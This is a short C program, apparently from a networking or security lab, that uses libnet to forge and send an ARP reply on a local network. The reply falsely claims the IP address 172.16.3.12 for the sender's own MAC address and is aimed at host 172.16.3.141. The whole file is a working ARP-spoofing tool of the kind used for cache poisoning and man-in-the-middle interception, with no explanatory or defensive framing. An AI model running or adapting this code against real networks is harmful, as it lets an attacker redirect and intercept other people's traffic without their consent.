#define _DEFAULT_SOURCE
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int
main(int argc, char* argv[]) {

	libnet_t *l;
	char err_buf[LIBNET_ERRBUF_SIZE];
	char* device;
	in_addr_t ipaddr;                     /* source ip address */
	in_addr_t destaddr;                   /* destination ip address */
	u_int8_t *macaddr;                    /* destination mac address */
	struct libnet_ether_addr *hwaddr;     /* source MAC address */
	libnet_ptag_t arp = 0;                /* ARP protocol tag */
	int r;

      	device = "ens160";
	if ((ipaddr = inet_addr ("172.16.3.12")) == -1) {
		fprintf (stderr, "Invalid claimed IP address\n");
		exit(EXIT_FAILURE);
	}
	
	if ((destaddr = inet_addr ("172.16.3.141")) == -1) {
		fprintf (stderr, "Invalid destination IP address\n");
		exit(EXIT_FAILURE);
	}
				
	if ((macaddr = libnet_hex_aton ("00:0c:29:5f:26:6a", &r)) == NULL) {
		fprintf (stderr, "Error on MAC address\n");
		exit(EXIT_FAILURE);
	}

	l = libnet_init(LIBNET_LINK, device, err_buf);
	if (l == NULL) {
		fprintf (stderr, "Error opening context: %s", err_buf);
		exit(EXIT_FAILURE);
	}

	hwaddr = libnet_get_hwaddr (l);
	arp = libnet_autobuild_arp(ARPOP_REPLY,
		       	(u_int8_t *) hwaddr ,
			(u_int8_t *) &ipaddr ,
			macaddr, 
			(u_int8_t *) &destaddr,
			l);

	if (arp == -1) {
		fprintf (stderr,"Unable to build ARP header: %s\n", libnet_geterror (l));
		exit(EXIT_FAILURE);
	}

	libnet_ptag_t eth = 0;                 /* Ethernet protocol tag */
	eth = libnet_build_ethernet (macaddr,
			(u_int8_t *) hwaddr,
			ETHERTYPE_ARP,
			NULL,
			0,
			l,
			0);
	if (eth == -1) {
		fprintf (stderr,"Unable to build Ethernet header: %s\n", libnet_geterror (l));
		exit(EXIT_FAILURE);
	}

	if ((libnet_write (l)) == -1) {
		fprintf (stderr, "Unable to send packet: %s\n", libnet_geterror (l));
		exit(EXIT_FAILURE);
	}
		
	libnet_destroy (l);

	return 0;
}
